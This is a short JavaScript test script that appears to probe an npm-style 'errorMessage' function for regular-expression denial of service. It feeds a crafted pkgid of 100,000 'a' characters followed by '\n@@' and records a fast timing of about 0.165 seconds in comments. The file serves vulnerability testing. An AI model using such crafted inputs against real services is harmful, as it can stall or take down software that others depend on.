import { errorMessage } from "./error-message.js";

//Attack String :""+"a"*100000+"\n@@"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "a";
}
str += "\n@@";

const er = {
  code: "E404",
  message: "a",
  stack: "b",
  pkgid: str,
};
console.log(errorMessage(er, ""));

// real    0m0.165s
// user    0m0.116s
// sys     0m0.021s
